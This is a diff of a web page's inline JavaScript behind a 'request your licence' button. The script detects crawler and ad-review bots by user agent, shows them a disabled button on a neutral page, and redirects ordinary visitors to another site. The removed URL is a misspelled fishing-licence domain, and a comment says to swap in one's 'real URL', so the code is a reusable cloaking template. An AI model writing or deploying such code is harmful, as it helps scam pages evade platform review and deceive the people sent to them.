@@ -46,19 +46,15 @@
   <button id="btnSolicitar">Solicite sua Licença</button>
 
   <script>
-    // Lista simples de bots para detectar
     const bots = ['Googlebot', 'AdsBot-Google', 'Bingbot', 'facebookexternalhit', 'Twitterbot'];
     const ua = navigator.userAgent;
-
     const isBot = bots.some(bot => ua.includes(bot));
 
     if (!isBot) {
-      // Usuário normal, redireciona para a página real
       document.getElementById('btnSolicitar').addEventListener('click', () => {
-        window.location.href = "https://licencadepescaa.fun/inicio/"; // <== Troque para sua URL real aqui
+        window.location.href = "https://sualandingreal.com"; // <== Troque para sua URL real aqui
       });
     } else {
-      // Bot, desativa botão e muda texto para mostrar que está na página neutra
       const btn = document.getElementById('btnSolicitar');
       btn.style.backgroundColor = '#ccc';
       btn.style.cursor = 'default';
